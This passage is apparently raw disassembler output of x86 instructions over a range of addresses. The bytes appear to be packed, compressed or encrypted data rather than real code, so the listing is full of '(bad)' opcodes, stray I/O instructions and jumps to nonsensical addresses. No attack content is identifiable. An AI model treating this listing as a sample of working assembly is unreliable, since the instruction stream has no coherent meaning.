  404a0a:	xchg   BYTE PTR [ebp+0x3f],al
  404a0d:	in     eax,dx
  404a0e:	cmp    eax,DWORD PTR [edi-0x7d9dc5fc]
  404a14:	xor    BYTE PTR [ebp+0x17],bl
  404a17:	dec    eax
  404a18:	fwait
  404a19:	ret    
  404a1a:	sub    BYTE PTR [edi+0x40],cl
  404a1d:	adc    ebp,ecx
  404a1f:	mov    esi,0x42e0b44c
  404a24:	jnp    0x404a7b
  404a26:	push   ds
  404a27:	les    ebx,FWORD PTR [eax]
  404a29:	adc    bh,ah
  404a2b:	(bad)
  404a2f:	arpl   si,si
  404a31:	fwait
  404a32:	out    0x4c,al
  404a34:	jl     0x404a6b
  404a36:	dec    ebx
  404a37:	mov    ecx,es
  404a39:	jb     0x4049ce
  404a3b:	mov    esi,0xbf055f04
  404a40:	les    ecx,FWORD PTR [ebx-0x52]
  404a43:	xor    al,0x65
  404a45:	imul   ebx,ebx,0x6f
  404a48:	cdq    
  404a49:	xchg   ebx,eax
  404a4a:	jmp    0x6cf8:0x173de70c
  404a51:	cmc    
  404a52:	test   al,0x97
  404a54:	scas   eax,DWORD PTR es:[edi]
  404a55:	fcmovnu st,st(7)
  404a57:	clc    
  404a58:	and    eax,0x983b59de
  404a5d:	mov    ebp,0x22bb684a
  404a62:	or     cl,BYTE PTR [edx+0x40e54f7a]
  404a68:	mov    dh,0x53
  404a6a:	inc    esp
  404a6b:	ins    DWORD PTR es:[edi],dx
  404a6c:	cmp    bh,ah
  404a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a6f:	bound  esi,QWORD PTR [edx+eiz*8+0x3aebd688]
  404a76:	xor    ebx,DWORD PTR [ebp-0x55]
  404a79:	push   ebx
  404a7a:	int    0xe2
  404a7c:	sbb    BYTE PTR [eax-0x58],0x22
  404a80:	imul   ecx,ebp,0xffffffb5
  404a83:	test   BYTE PTR [eax+edx*8],ah
  404a86:	dec    edx
  404a87:	fadd   DWORD PTR ds:0xa5a6b3c8
  404a8d:	imul   dx,si,0xffe1
  404a91:	mov    ah,0xb4
  404a93:	jae    0x404ab6
  404a95:	pop    esp
  404a96:	adc    DWORD PTR [ebp-0x29e8b150],eax
  404a9c:	jne    0x404a60
  404a9e:	cs ror bl,1
  404aa1:	mov    dl,0xfe
  404aa3:	pop    ss
  404aa4:	inc    eax
  404aa5:	je     0x404b0e
  404aa7:	pavgw  mm6,mm6
  404aaa:	aam    0x39
  404aac:	ss jg  0x404aaf
  404aaf:	add    al,0x50
  404ab1:	mov    bh,0xb
  404ab3:	fs jb  0x404a3c
  404ab6:	add    ecx,DWORD PTR [eax-0x1d77018]
  404abc:	dec    esp
  404abd:	stc    
  404abe:	pop    ds
  404abf:	xchg   DWORD PTR [edi],ebx
  404ac1:	push   0x501d0b19
  404ac6:	push   es
  404ac7:	add    DWORD PTR [esi+0x40dbbf0],esi
  404acd:	push   ebx
  404ace:	push   cs
  404acf:	xor    al,0x7
  404ad1:	xchg   ecx,eax
  404ad2:	sahf   
  404ad3:	es add eax,0x6802e95c
  404ad9:	(bad)  
  404ada:	push   edx
  404adb:	push   cs
  404adc:	dec    ecx
  404add:	shl    DWORD PTR [ebx+0x4b],1
  404ae0:	and    edx,eax
  404ae2:	pop    esi
  404ae3:	(bad)  
  404ae4:	shr    bh,cl
  404ae6:	pop    ebx
  404ae7:	inc    esp
  404ae8:	push   esi
  404ae9:	cmp    ebp,DWORD PTR ds:0x5103e0a6
  404aef:	mov    ecx,0xdd990f5b
  404af4:	push   ds
  404af5:	push   ebp
  404af6:	xor    eax,0x9fa31c17
  404afb:	or     al,0xd1
  404afd:	inc    esi
  404afe:	mov    BYTE PTR [ecx+esi*2+0x15],cl
  404b02:	mov    al,ds:0x84f9c38e
  404b07:	xchg   esi,eax
  404b08:	mov    eax,0x6807c7a1
  404b0d:	popa   
  404b0e:	outs   dx,DWORD PTR ds:[esi]
  404b0f:	shl    DWORD PTR [edx],cl
  404b11:	outs   dx,DWORD PTR ds:[esi]
  404b12:	cmc    
  404b13:	popf   
  404b14:	call   0x8a15ca1d
  404b19:	les    ecx,FWORD PTR [esi+0x467b6df2]
  404b1f:	xchg   esi,eax
  404b20:	rcl    BYTE PTR [edx+ebx*2],cl
  404b23:	dec    esi
  404b24:	adc    esp,eax
  404b26:	push   ds
  404b27:	bound  esp,QWORD PTR [ebx+0x1f]
  404b2a:	inc    edi
  404b2b:	mov    ds:0x317dac0,al
  404b30:	dec    ebp
  404b31:	popa   
  404b32:	(bad)  [ecx+0x3bb6322a]
  404b38:	repz xchg ecx,eax
  404b3a:	inc    ecx
  404b3b:	loop   0x404b97
  404b3d:	in     al,dx
  404b3e:	push   0x5a
  404b40:	xor    al,0x50
  404b42:	dec    edi
  404b43:	mov    dl,0x9e
  404b45:	in     al,dx
  404b46:	and    eax,0x70a4a6ca
  404b4b:	mov    eax,0x45668b2d
  404b50:	jnp    0x404b7e
  404b52:	mov    edi,0xf347f56d
  404b57:	sub    ebp,DWORD PTR [ebp+ecx*8-0x75]
  404b5b:	stc    
  404b5c:	ror    DWORD PTR [eax-0x694aebb5],0xc9
  404b63:	sbb    BYTE PTR [ebp-0x66],bh
  404b66:	pop    esi
  404b67:	pushf  
  404b68:	iret   
  404b69:	lock test eax,0xf6bfd58
  404b6f:	ds retf 
  404b71:	aaa    
  404b72:	cmp    cl,BYTE PTR ss:[eax]
  404b75:	aas    
  404b76:	loopne 0x404b8d
  404b78:	and    eax,0xe6d070b2
  404b7d:	and    edi,DWORD PTR [ebx+0x3fb1bc3d]
  404b83:	mov    al,ds:0x1485ea1f
  404b88:	std    
  404b89:	stos   BYTE PTR es:[edi],al
  404b8a:	fnsave [ebp+0x399ebaff]
  404b90:	aas    
  404b91:	pop    ds
  404b92:	push   ebp
  404b93:	les    ebx,FWORD PTR [edi+ebp*1-0x58d975cb]
  404b9a:	mov    eax,ds:0xc9debd64
  404b9f:	repz clc 
  404ba1:	jno    0x404b7a
  404ba3:	jno    0x404baf
  404ba5:	fisubr WORD PTR [edx+eiz*4]
  404ba8:	retf   0x9f25
  404bab:	xlat   BYTE PTR ds:[ebx]
  404bac:	ficom  DWORD PTR [ebp+0x0]
  404baf:	(bad)  
  404bb0:	mov    bh,0xde
  404bb2:	ja     0x404beb
  404bb4:	into   
  404bb5:	rcl    DWORD PTR [edi],1
  404bb7:	cmp    al,0x89
  404bb9:	ret    0x806b
  404bbc:	and    DWORD PTR [esi+0x3c6f1438],ebp
  404bc2:	dec    bx
  404bc4:	inc    esp
  404bc5:	(bad)  
  404bc6:	dec    ebp
  404bc7:	jmp    0xa722:0xbdf46a07
  404bce:	jmp    0x374a:0xd0ed2592
  404bd5:	scas   al,BYTE PTR es:[edi]
  404bd6:	iret   
  404bd7:	in     al,0x44
  404bd9:	mov    ?,WORD PTR [edi+0x44]
  404bdc:	push   0x46c0fae0
  404be1:	popa   
  404be2:	(bad)  [esi-0x3e]
  404be5:	or     BYTE PTR [ebx+0xd],0x49
  404be9:	inc    esi
  404bea:	fdiv   QWORD PTR [ecx+0x70]
  404bed:	daa    
  404bee:	repz sbb BYTE PTR [ebx],0x44
  404bf2:	jge    0x404bad
  404bf4:	cs mov es,edx
  404bf7:	shl    DWORD PTR [edi-0x54af2389],cl
  404bfd:	cmc    
  404bfe:	(bad)  
  404c00:	in     al,dx
  404c01:	lods   al,BYTE PTR ds:[esi]
  404c02:	jae    0x404c81
  404c04:	ret    0x9578
  404c07:	mov    edx,ebp
  404c09:	mov    ebx,0x172f6e4e
  404c0e:	data16 jbe 0x404c6c
  404c11:	inc    edx
  404c12:	mov    ecx,0xcd819fc0
  404c17:	push   eax
  404c18:	(bad)  
  404c19:	pop    ss
  404c1a:	ficom  DWORD PTR [edi-0x18]
  404c1d:	mov    BYTE PTR [edx+ebp*4+0x71],cl
  404c21:	enter  0x4931,0x51
  404c25:	in     eax,0x5e
  404c27:	(bad)
  404c2a:	dec    ebx
  404c2b:	pop    ebx
  404c2c:	data16 add al,0x7f
  404c2f:	rcl    ebx,cl
  404c31:	mov    eax,0xeaae0f91
  404c36:	das    
  404c37:	jmp    0x404c62
  404c39:	ror    BYTE PTR ds:0x46f72091,1
  404c3f:	stos   DWORD PTR es:[edi],eax
  404c40:	mov    bh,0x61
  404c42:	pop    esp
  404c43:	mov    BYTE PTR ds:0xc03360a9,al
  404c49:	mov    edx,0x5c3fda04
  404c4e:	popa   
  404c4f:	xor    al,0x49
  404c51:	mov    esp,0xac295282
  404c56:	inc    ebp
  404c57:	xchg   ecx,eax
  404c58:	push   edx
  404c59:	int    0x41
  404c5b:	xchg   esi,eax
  404c5c:	xor    BYTE PTR [ebp-0x765d9114],0x26
  404c63:	ss jmp 0xebfaf6e4
  404c69:	xor    eax,0x75831dae
  404c6e:	sub    eax,0x7c25e8b
  404c73:	dec    eax
  404c74:	push   ds
  404c75:	jno    0x404ca4
  404c77:	add    BYTE PTR [ecx],ch
  404c79:	mov    bh,0xa0
  404c7b:	ds retf 0xcb20
  404c7f:	fld    TBYTE PTR [ebp+0x666dffa4]
  404c85:	xchg   ecx,eax
  404c86:	scas   al,BYTE PTR es:[edi]
  404c87:	pop    edi
  404c88:	mov    dh,0xb9
  404c8a:	sar    DWORD PTR [esi+edi*8+0x44],1
  404c8e:	(bad)  
  404c8f:	into   
  404c90:	clc    
  404c91:	ds test eax,0xab734cef
  404c97:	outs   dx,DWORD PTR ds:[esi]
  404c98:	mov    ebp,0x53e420fe
  404c9d:	loope  0x404cbe
  404c9f:	and    al,0xfb
  404ca1:	add    eax,0x66495736
  404ca6:	cmp    al,0x86
  404ca8:	sbb    edi,DWORD PTR [edx+edi*8]
  404cab:	xchg   ebp,eax
  404cac:	adc    al,0xdd
  404cae:	in     eax,dx
  404caf:	or     BYTE PTR [esi],ah
  404cb1:	inc    eax
  404cb2:	clc    
  404cb3:	fcomp  QWORD PTR [edx]
  404cb5:	sbb    BYTE PTR [edx],0x35
  404cb8:	or     al,0x1e
  404cba:	mov    esi,0xd8de837a
  404cbf:	ja     0x404d0d
  404cc1:	repnz retf 0xb7b1
  404cc5:	scas   eax,DWORD PTR es:[edi]
  404cc6:	hlt    
  404cc7:	ins    BYTE PTR es:[edi],dx
  404cc8:	out    dx,al
  404cc9:	stc    
  404cca:	rol    BYTE PTR [ecx+0x5],1
  404ccd:	popa   
  404cce:	sbb    bh,BYTE PTR [eax-0x3903f0dd]
  404cd4:	xchg   ebp,eax
  404cd5:	pushf  
  404cd6:	mov    edx,0xa8bb5bf4
  404cdb:	lock iret 
  404cdd:	popa   
  404cde:	sub    esi,esp
  404ce0:	mov    ecx,0x77e46ab8
  404ce5:	(bad)  
  404ce6:	in     eax,dx
  404ce7:	lods   eax,DWORD PTR ds:[esi]
  404ce8:	nop
  404ce9:	cs pushf 
  404ceb:	xor    BYTE PTR [esi+0x10],al
  404cee:	dec    esi
  404cef:	das    
  404cf0:	cld    
  404cf1:	or     DWORD PTR [edx+0x2],ebp
  404cf4:	ja     0x404d62
  404cf6:	ins    DWORD PTR es:[edi],dx
  404cf7:	xchg   ebp,eax
  404cf8:	sahf   
  404cf9:	push   edi
  404cfa:	jbe    0x404d23
  404cfc:	cmp    ebp,edi
  404cfe:	es enter 0x66d4,0x7e
  404d03:	add    BYTE PTR [ecx+0x72614332],ah
  404d09:	sub    ch,ah
  404d0b:	les    ebx,FWORD PTR [edi]
  404d0d:	iret   
  404d0e:	jg     0x404cf5
  404d10:	retf   0x1250
  404d13:	sbb    al,0x74
  404d15:	jno    0x404cb7
  404d17:	fnsave ds:0x1023059
  404d1d:	ins    DWORD PTR es:[edi],dx
  404d1e:	pop    ss
  404d1f:	test   eax,0x4faa37e6
  404d24:	in     eax,0x7b
  404d26:	xchg   edi,eax
  404d27:	jp     0x404da3
  404d29:	ss addr16 dec edx
  404d2c:	out    0xa0,eax
  404d2e:	rol    DWORD PTR [eax-0x41],0xa5
  404d32:	push   eax
  404d33:	and    bl,dl
  404d35:	sub    ebp,esi
  404d37:	adc    ch,BYTE PTR [ecx]
  404d39:	(bad)  
  404d3a:	mov    ecx,0x5492974f
  404d3f:	xchg   DWORD PTR [eax+0x63],esp
  404d42:	adc    al,0x42
  404d44:	mov    al,ds:0xa7fe5dff
  404d49:	fisttp DWORD PTR [eax+0x5af0d37e]
  404d4f:	and    ebp,DWORD PTR [esi-0x7188d2f8]
  404d55:	pop    es
  404d56:	adc    DWORD PTR [esi],0xc77ee3bc
  404d5c:	fcom   QWORD PTR [ecx-0x244e8723]
  404d62:	pop    es
  404d63:	into   
  404d64:	mov    ebx,ds
  404d66:	call   0xbe76fd2a
  404d6b:	jmp    0x404d6b
  404d6d:	add    BYTE PTR [esi],cl
  404d6f:	aam    0xcc
  404d71:	mov    edi,DWORD PTR [esi]
  404d73:	mov    ah,0x68
  404d75:	pushf  
  404d76:	jno    0x404d87
  404d78:	shl    BYTE PTR [ebx+0x16],cl
  404d7b:	cmp    al,0x85
  404d7d:	add    al,0xb4
  404d7f:	and    esi,DWORD PTR [eax]
  404d81:	push   esp
  404d82:	push   ebx
  404d83:	(bad)  
  404d84:	sub    eax,0x40de33df
  404d89:	xchg   BYTE PTR [edi-0x56],ah
  404d8c:	cmp    al,0xa6
  404d8e:	clc    
  404d8f:	sbb    DWORD PTR [ebx+ebx*2-0x35],ebx
  404d93:	mov    dh,0x9d
  404d95:	jle    0x404d64
  404d97:	test   al,0xc3
  404d99:	psubsw mm1,QWORD PTR [eax]
  404d9c:	repz fisttp WORD PTR [edx+0x1721da1c]
  404da3:	or     esp,DWORD PTR ds:0x33aa99f3
  404da9:	retf   
  404daa:	pushf  
  404dab:	sub    eax,DWORD PTR [eax-0x48]
  404dae:	idiv   edx
  404db0:	in     al,0x48
  404db2:	test   eax,0xd987c8c2
  404db7:	add    DWORD PTR [ebx-0x5213dad2],esp
  404dbd:	push   cs
  404dbe:	loopne 0x404dfd
  404dc0:	xor    esi,ebp
  404dc2:	and    al,0x3d
  404dc4:	xchg   edi,eax
  404dc5:	sbb    BYTE PTR [edi],0xa6
  404dc8:	mov    ds:0x6be88da8,eax
  404dcd:	(bad)  
  404dce:	sub    ebp,DWORD PTR [edx+0x63]
  404dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd2:	adc    ch,ah
  404dd4:	fisttp QWORD PTR [esi+eax*4-0x7c91386b]
  404ddb:	mov    BYTE PTR [ebp+ebp*1+0x4e68559e],al
  404de2:	jmp    0x404e2e
  404de4:	(bad)  
  404de5:	pop    esi
  404de6:	pop    ds
  404de7:	out    0x1b,eax
  404de9:	add    DWORD PTR [esi-0x23],ecx
  404dec:	pop    esp
  404ded:	test   BYTE PTR [ebx-0x1405326f],dh
  404df3:	lds    esi,FWORD PTR [eax*2-0x5254349f]
  404dfa:	inc    edx
  404dfb:	lods   al,BYTE PTR ds:[esi]
  404dfc:	retf   0x46e7
  404dff:	test   DWORD PTR [eax],ecx
  404e01:	cmp    al,0xb1
  404e03:	cmp    eax,0x62f0e0f5
  404e08:	ret    0x18dd
  404e0b:	ret    0x64e0
  404e0e:	cwde   
  404e0f:	imul   edx,DWORD PTR [edi],0x2ff8844f
  404e15:	jmp    0x98879232
  404e1a:	add    BYTE PTR [edi+0x5fa274b2],ch
  404e20:	sbb    ah,BYTE PTR [ebp-0x3a]
  404e23:	sub    DWORD PTR [esi-0x58cb8353],edx
  404e29:	xchg   esp,eax
  404e2a:	xchg   esi,eax
  404e2b:	out    0x30,al
  404e2d:	and    al,0xfc
  404e2f:	cdq    
  404e30:	or     al,0xbc
  404e32:	push   esp
  404e33:	nop
  404e34:	jne    0x404e39
  404e36:	adc    ah,BYTE PTR [edi]
  404e38:	in     al,0x6d
  404e3a:	adc    eax,0x2a236821
  404e3f:	dec    edx
  404e40:	fs or  dl,dh
  404e43:	lods   al,BYTE PTR ds:[esi]
  404e44:	sti    
  404e45:	ins    BYTE PTR es:[edi],dx
  404e46:	xchg   ecx,eax
  404e47:	mov    edi,0xcdc99db2
  404e4c:	adc    BYTE PTR [ecx],bh
  404e4e:	inc    esi
  404e4f:	lock repnz icebp 
  404e52:	iret   
  404e53:	nop
  404e54:	(bad)  
  404e55:	out    dx,eax
  404e56:	loop   0x404e7d
  404e58:	mov    ?,WORD PTR [ebx-0x3ffb4be6]
  404e5e:	inc    edi
  404e5f:	ficom  WORD PTR [eax+0xfea3742]
  404e65:	jl     0x404e12
  404e67:	leave  
  404e68:	adc    al,0x4
  404e6a:	fsubr  DWORD PTR [esi]
  404e6c:	dec    eax
  404e6d:	xor    al,0x5c
  404e6f:	pop    ecx
  404e70:	lods   eax,DWORD PTR ds:[esi]
  404e71:	xchg   edi,eax
  404e72:	mov    cl,0xc8
  404e74:	or     edi,DWORD PTR [edi+ebx*8]
  404e77:	bound  ebx,QWORD PTR [edi-0x26]
  404e7a:	(bad)  
  404e7b:	mov    bh,0x7a
  404e7d:	dec    edx
  404e7e:	ins    BYTE PTR es:[edi],dx
  404e7f:	das    
  404e80:	or     DWORD PTR [edi-0x4f34fe7c],ebp
  404e86:	sub    eax,0xfed4d627
  404e8b:	out    0xb7,al
  404e8d:	or     eax,DWORD PTR [ebp+0x2c]
  404e90:	cmp    esp,esi
  404e92:	(bad)  
  404e93:	dec    ecx
  404e94:	lods   al,BYTE PTR ds:[esi]
  404e95:	cwde   
  404e96:	cmc    
  404e97:	jo     0x404ee9
  404e99:	shl    DWORD PTR [ebx],0x38
  404e9c:	stos   BYTE PTR es:[edi],al
  404e9d:	es mov ebx,0x3a324342
  404ea3:	mov    esi,0xda8f9054
  404ea8:	pop    ebx
  404ea9:	mov    ebp,0x715e31c6
  404eae:	or     DWORD PTR [eax-0x1],edx
  404eb1:	mov    bl,0x9
  404eb3:	and    al,0x89
  404eb5:	jmp    0xb7a0:0x359460a5
  404ebc:	retf   
  404ebd:	fld    TBYTE PTR [eax]
  404ebf:	xor    ebp,0x3c
  404ec2:	pusha  
  404ec3:	rol    DWORD PTR [esi-0x73277936],1
  404ec9:	fstp   st(2)
  404ecb:	xchg   edi,eax
  404ecc:	adc    esp,esp
  404ece:	fwait
  404ecf:	and    BYTE PTR ds:0x58272143,dl
  404ed5:	fs ds clc 
  404ed8:	mov    al,ds:0x5a850720
  404edd:	stos   DWORD PTR es:[edi],eax
  404ede:	js     0x404e6a
  404ee0:	add    edx,DWORD PTR [esi+0x57181f41]
  404ee6:	push   ss
  404ee7:	sbb    bl,bl
  404ee9:	mov    dl,0xcc
  404eeb:	sub    eax,0xbfa6c38a
  404ef0:	pop    ebx
  404ef1:	and    BYTE PTR [edi],dl
  404ef3:	xchg   esp,eax
  404ef4:	adc    al,0x63
  404ef6:	scas   eax,DWORD PTR es:[edi]
  404ef7:	(bad)  
  404ef8:	cli    
  404ef9:	icebp  
  404efa:	sbb    BYTE PTR [edx],dl
  404efc:	jp     0x404ed9
  404efe:	dec    ecx
  404eff:	je     0x404f61
  404f01:	stos   DWORD PTR es:[edi],eax
  404f02:	jae    0x404f58
  404f04:	cwde   
  404f05:	mov    dl,0x39
  404f07:	dec    edx
  404f08:	or     dh,BYTE PTR [ecx]
  404f0a:	hlt    
  404f0b:	int    0x9d
  404f0d:	sti    
  404f0e:	ret    
  404f0f:	clc    
  404f10:	adc    eax,0x457f079d
  404f15:	pushf  
  404f16:	bnd jmp 0xd4b74fb7
  404f1c:	out    dx,eax
  404f1d:	xor    al,0xc3
  404f1f:	lahf   
  404f20:	dec    esp
  404f21:	pop    ebx
  404f22:	dec    ebx
  404f23:	pop    ss
  404f24:	fld    TBYTE PTR [ecx+0x3c730af4]
  404f2a:	cmp    eax,DWORD PTR [ecx+0x6]
  404f2d:	mov    edx,DWORD PTR [eax-0x2057c976]
  404f33:	dec    edx
  404f34:	sti    
  404f35:	ret    
  404f36:	pushf  
  404f37:	(bad)  
  404f38:	fmul   DWORD PTR [ecx]
  404f3a:	or     DWORD PTR [edi-0x34],ebp
  404f3d:	loopne 0x404f12
  404f3f:	jl     0x404f51
  404f41:	vmwrite ebx,eax
  404f44:	scas   eax,DWORD PTR es:[edi]
  404f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f47:	ins    BYTE PTR es:[edi],dx
  404f48:	enter  0x79a3,0xf7
  404f4c:	fld    DWORD PTR [edx+0x23]
  404f4f:	inc    eax
  404f50:	push   ebx
  404f51:	popa   
  404f52:	pop    ecx
  404f53:	in     al,dx
  404f54:	and    ch,0xee
  404f57:	das    
  404f58:	ret    
  404f59:	(bad)  
  404f5a:	mov    WORD PTR [edx],ds
  404f5c:	jne    0x404f70
  404f5e:	test   BYTE PTR es:[edx-0x16],ah
  404f62:	cwde   
  404f63:	add    BYTE PTR [edx-0x7985597c],dl
  404f69:	out    dx,al
  404f6a:	mov    al,ds:0xfd253fe2
  404f6f:	(bad)  
  404f70:	fadd   QWORD PTR [edx+0x25f8a100]
  404f76:	dec    ebx
  404f77:	sub    BYTE PTR [edx+0x5d],dh
  404f7a:	mov    WORD PTR [eax],es
  404f7c:	cmp    ecx,ecx
  404f7e:	cmp    BYTE PTR [ecx+esi*1],ch
  404f81:	cmp    ah,BYTE PTR [ebx-0x5]
  404f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f85:	iret   
  404f86:	ror    BYTE PTR [esp+eiz*2+0x57],cl
  404f8a:	xlat   BYTE PTR ds:[ebx]
  404f8b:	jmp    0x9a8c74f6
  404f90:	jmp    0xd427dc87
  404f95:	(bad)  
  404f97:	push   ds
  404f98:	repz retf 
  404f9a:	pop    ecx
  404f9b:	sti    
  404f9c:	jnp    0x404fe9
  404f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f9f:	or     edx,ebx
  404fa1:	data16 or BYTE PTR [esi-0x76],bl
  404fa5:	aaa    
  404fa6:	xchg   edi,eax
  404fa7:	push   esi
  404fa8:	rcr    DWORD PTR [eax-0x6149f037],cl
  404fae:	or     BYTE PTR [ecx-0x62],cl
  404fb1:	push   edx
  404fb2:	nop
  404fb3:	cdq    
  404fb4:	ret    0xf474
  404fb7:	push   esp
  404fb8:	dec    ecx
  404fb9:	sahf   
  404fba:	push   ebx
  404fbb:	in     eax,dx
  404fbc:	mov    ds:0x63d4911e,eax
  404fc1:	sub    ch,BYTE PTR [ebx+0x7d601df1]
  404fc7:	mov    edi,0x71ff8dd6
  404fcc:	sahf   
  404fcd:	jnp    0x404fb7
  404fcf:	jp     0x404f8b
  404fd1:	cmp    eax,0xb4786ec2
  404fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fd7:	sbb    DWORD PTR [eax+0x65130df1],ebp
  404fdd:	lods   al,BYTE PTR ds:[esi]
  404fde:	add    ebp,DWORD PTR ds:0xfebcc25
  404fe4:	xchg   esi,eax
  404fe5:	xchg   BYTE PTR [edx],ah
  404fe7:	add    eax,0xc75e349d
  404fec:	inc    edx
  404fed:	xchg   DWORD PTR [ebp-0x7bcb5426],eax
  404ff3:	loopne 0x405024
  404ff5:	test   BYTE PTR [edi+edx*4+0x476ccef0],0xd5
  404ffd:	mov    dl,BYTE PTR [ebp+eax*4-0x17e21a63]
  405004:	nop
  405005:	mov    eax,ds:0x3db340e1
  40500a:	aam    0x40
  40500c:	mov    fs,WORD PTR [ecx+0x79f6299d]
  405012:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  405014:	pop    ebx
  405015:	out    dx,eax
  405016:	shl    BYTE PTR [ebx+edi*8],cl
  405019:	ins    BYTE PTR es:[edi],dx
  40501a:	push   ds
  40501b:	jmp    FWORD PTR [ecx-0x3e72d028]
  405021:	mov    ebp,0x43d35e3a
  405026:	hlt    
  405027:	pop    ss
  405028:	lods   eax,DWORD PTR ds:[esi]
  405029:	mov    ds,WORD PTR [edi+0x29]
  40502c:	mov    WORD PTR [eax-0x2094644f],cs
  405032:	push   ss
  405033:	fistp  QWORD PTR [ecx-0x31cbeae1]
  405039:	xor    DWORD PTR [ebx],esp
  40503b:	lock clc 
  40503d:	std    
  40503e:	pop    esi
  40503f:	call   0xf757974c
  405044:	jmp    edi
  405046:	xlat   BYTE PTR ds:[ebx]
  405047:	fld    QWORD PTR [edi-0x71fae255]
  40504d:	sti    
  40504e:	cmc    
  40504f:	pop    ss
  405050:	loop   0x405020
  405052:	int    0x78
  405054:	push   esi
  405055:	pop    ebx
  405056:	nop
  405057:	test   eax,0x4fce1f0f
  40505c:	call   0xe6f6:0x2b501e80
  405063:	xchg   esi,eax
  405064:	adc    eax,0x7fd3502e
  405069:	mov    al,ds:0x689be8fc
  40506e:	sub    al,BYTE PTR [esi+0x2373ec1c]
  405074:	mov    ebx,0x4095d9b0
  405079:	and    al,0xdb
  40507b:	ins    DWORD PTR es:[edi],dx
  40507c:	imul   edx,eax,0x8949c503
  405082:	jmp    0x2e18:0x8474be00
  405089:	lods   al,BYTE PTR ds:[esi]
  40508a:	lea    eax,[edx+eiz*8]
  40508d:	jb     0x405032
  40508f:	into   
  405090:	leave  
  405091:	and    ebx,DWORD PTR [edx]
  405093:	add    DWORD PTR [esi+0x4e3d3f05],0xdb3dbe1f
  40509d:	iret   
  40509e:	jge    0x4050e0
  4050a0:	in     eax,0x40
  4050a2:	push   ss
  4050a3:	add    DWORD PTR [ebx-0x1e9ac122],edx
  4050a9:	pop    ds
  4050aa:	cdq    
  4050ab:	std    
  4050ac:	std    
  4050ad:	mov    edi,0x6590d270
  4050b2:	es (bad) 
  4050b4:	aam    0xe3
  4050b6:	jmp    0xaa4d9928
  4050bb:	xor    bl,BYTE PTR [ebp+eiz*4+0x5f2ac6f1]
  4050c2:	mov    bh,0xd2
  4050c4:	into   
  4050c5:	mov    esi,es
  4050c7:	stc    
  4050c8:	mov    ebx,0x184cac2c
  4050cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ce:	(bad)  [ecx]
  4050d0:	xor    eax,0xc72439df
  4050d5:	jmp    0x39eb:0x67c04441
  4050dc:	or     bh,BYTE PTR [eax-0x34121eb0]
  4050e2:	sbb    dl,BYTE PTR [ebp-0x49807cc7]
  4050e8:	cmp    esi,DWORD PTR [eax+0x51]
  4050eb:	push   ebp
  4050ec:	loope  0x405123
  4050ee:	lods   eax,DWORD PTR ds:[esi]
  4050ef:	add    al,0x6f
  4050f1:	or     bl,BYTE PTR [esi-0x54]
  4050f4:	fsub   DWORD PTR [eax+ebx*1-0x6d46d6cb]
  4050fb:	popa   
  4050fc:	add    ecx,DWORD PTR [ecx-0x28874277]
  405102:	mov    eax,ds:0x54767614
  405107:	pop    ss
  405108:	jmp    0xa9055f1c
  40510d:	mov    al,ds:0x69b40da
  405112:	fsubr  QWORD PTR [esi-0x4b6c3e4d]
  405118:	pop    ecx
  405119:	push   ss
  40511a:	push   esi
  40511b:	and    al,0x1a
  40511d:	sar    ah,cl
  40511f:	aas    
  405120:	add    bh,BYTE PTR [edi+0x39e37191]
  405126:	push   ecx
  405127:	enter  0x98da,0xb8
  40512b:	call   0x2639:0x1bb3e78f
  405132:	repz mov ebp,DWORD PTR [esi]
  405135:	push   ebx
  405136:	aaa    
  405137:	ror    DWORD PTR [ecx],1
  405139:	jo     0x4050d2
  40513b:	lds    esp,FWORD PTR [ecx]
  40513d:	mov    dh,0xe9
  40513f:	mov    bl,0xd0
  405141:	je     0x4050db
  405143:	push   ecx
  405144:	push   ds
  405145:	enter  0x8672,0xdc
  405149:	in     al,0xbb
  40514b:	sbb    ebx,DWORD PTR [ecx-0x6e9047e1]
  405151:	sub    eax,0x88a7e408
  405156:	scas   eax,DWORD PTR es:[edi]
  405157:	xlat   BYTE PTR ds:[ebx]
  405158:	adc    edi,DWORD PTR [eax]
  40515a:	mov    BYTE PTR [ebx-0xc],al
  40515d:	lods   eax,DWORD PTR ds:[esi]
  40515e:	icebp  
  40515f:	leave  
  405160:	push   0xffffffe3
  405162:	sbb    ch,BYTE PTR [ebp-0x14728]
  405168:	fsubr  QWORD PTR [edi]
  40516a:	arpl   WORD PTR [ebp+0x6965474],bp
  405170:	or     ebp,DWORD PTR [eax-0x2b362a47]
  405176:	stos   BYTE PTR es:[edi],al
  405177:	ret    0x1d4b
  40517a:	xor    eax,DWORD PTR [ebx]
  40517c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40517d:	pop    ss
  40517e:	in     al,0x21
  405180:	je     0x405160
  405182:	xor    bl,BYTE PTR [ebp-0xffc8e19]
  405188:	sub    eax,0xf22bf38
  40518d:	dec    eax
  40518e:	fs aam 0x3
  405191:	mov    ecx,0x3b1f7609
  405196:	inc    esp
  405197:	pop    ebp
  405198:	pop    edx
  405199:	leave  
  40519a:	aas    
  40519b:	es pop ds
  40519d:	mov    ch,0xc4
  40519f:	fnstcw WORD PTR [ebp+0x18]
  4051a2:	sub    al,0x4e
  4051a4:	fmul   st,st(3)
  4051a6:	lds    ebx,FWORD PTR [edi+0x1915209a]
  4051ac:	jae    0x4051b6
  4051ae:	pop    ss
  4051af:	ret    0x5b05
  4051b2:	xor    DWORD PTR [edi+0x731bc475],edx
  4051b8:	aam    0xd4
  4051ba:	icebp  
  4051bb:	cmc    
  4051bc:	popa   
  4051bd:	and    DWORD PTR [ebx+0x3d],0xc67374b4
  4051c4:	(bad)  
  4051c5:	aam    0xe2
  4051c7:	mov    esp,DWORD PTR [esi]
  4051c9:	or     DWORD PTR [ecx-0x6f],0x4b3fadab
  4051d0:	xchg   esi,eax
  4051d1:	call   0x4e7d:0x3ade2cad
  4051d8:	fwait
  4051d9:	cmp    ecx,DWORD PTR [edx]
  4051db:	std    
  4051dc:	jb     0x4051f8
  4051de:	sub    ch,BYTE PTR [ebp+0x5dc541ee]
  4051e4:	clc    
